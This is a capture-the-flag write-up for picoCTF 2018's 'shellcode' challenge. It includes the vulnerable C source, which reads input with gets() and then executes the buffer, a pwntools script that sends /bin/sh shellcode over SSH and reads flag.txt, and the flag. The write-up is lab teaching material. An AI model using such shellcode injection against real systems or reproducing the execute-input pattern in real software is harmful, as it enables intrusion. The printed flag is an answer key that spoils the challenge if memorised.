# Problem
This [program](https://2018shell1.picoctf.com/static/77b3483ed4e56701fa7db9c5bdea4d03/vuln) executes any input you give it. Can you get a shell? You can find the program in /problems/shellcode_1_cec2eb801137d645a9f15b9b6af5347a on the shell server. [Source](https://2018shell1.picoctf.com/static/77b3483ed4e56701fa7db9c5bdea4d03/vuln.c).

## Hints:
Maybe try writing some shellcode?

You also might be able to find some good shellcode online.

## Solution:

Lets download the files:
```bash
wget https://2018shell1.picoctf.com/static/77b3483ed4e56701fa7db9c5bdea4d03/vuln
wget https://2018shell1.picoctf.com/static/77b3483ed4e56701fa7db9c5bdea4d03/vuln.c
```

First, we investigate the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();
     
  return 0;
}
```

The function ```vuln()``` just reads the buffer from the input, and after that, ```main()``` will execute the buffer.

All we need to do is the send a [shellcode](https://en.wikipedia.org/wiki/Shellcode) to the program.

We can get a shellcode from [shell-storm](http://shell-storm.org/shellcode/), or use those from [pwntools](https://github.com/Gallopsled/pwntools)

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = ''
pw = ''

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)

  s.set_working_directory('/problems/shellcode_1_cec2eb801137d645a9f15b9b6af5347a/')
  p = s.process('./vuln')

print p.recv()
log.info('Sending shellcode: {}'.format(asm(shellcraft.i386.linux.sh())))
p.sendline(asm(shellcraft.i386.linux.sh()))

if debug:
  p.interactive()
else:
  p.sendline('ls')
  p.sendline('cat flag.txt')
  p.sendline('exit')

  print p.recvall()
```

Flag: picoCTF{shellc0de_w00h00_26e91a77}